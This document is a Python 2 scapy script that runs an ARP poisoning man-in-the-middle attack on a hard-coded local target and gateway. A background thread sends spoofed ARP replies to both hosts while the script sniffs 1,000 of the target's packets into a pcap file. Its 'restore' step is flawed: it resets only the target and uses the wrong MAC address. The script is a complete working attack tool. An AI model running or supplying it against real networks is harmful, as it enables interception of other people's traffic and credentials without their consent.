from scapy.all import *
import os
import threading
import signal


interface = 'wlp2s0'
target    = "192.168.43.222"
gateway   = "192.168.43.1" 
packet_count   = 1000

conf.iface = interface
conf.verb  = 0


def restore_target(gateway,gateway_mac,target,target_mac):

    print "[*] Restoring target"
    send(ARP(op=2,psrc=gateway,pdst=target,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
    os.kill(os.getpid(),signal.SIGINT)

def get_mac(ip_address):
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
    for s,r in responses:
        return r[Ether].src
    return

def poison_target(gateway,gateway_mac,target,target_mac):

    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway
    poison_target.pdst = target
    poison_target.hwdst=target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target
    poison_gateway.pdst = gateway
    poison_gateway.hwdst= gateway_mac

    print "[*] starting ARP Poisoning"

    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway,gateway_mac,target,target_mac)
    print "[*] ARP Poison completed"

    return



print "[+] Setting up interface : %s"%interface

gateway_mac = get_mac(gateway)

if gateway_mac is None:
    print "[!] Failed to get gateway MAC"
    sys.exit(0)
else:
    print "[*] Gateway %s is at %s"%(gateway,gateway_mac)

target_mac = get_mac(target)

if target_mac is None:
    print "[!!!] Failed to get target MAC"
    sys.exit(0)

else:
    print "[*] target is at %s:%s"%(target,target_mac)


poison_thread = threading.Thread(target=poison_target,args=(gateway,gateway_mac,target,target_mac))
poison_thread.start()

try:
    print "[*] Starting sniffer for %d packets "%packet_count

    bpf_filter = 'ip host %s'%target
    packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)
    wrpcap('arper.pcap',packets)
    restore_target(gateway,gateway_mac,target,target_mac)
except KeyboardInterrupt:
    restore_target(gateway,gateway_mac,target,target_mac)
    sys.exit(0)


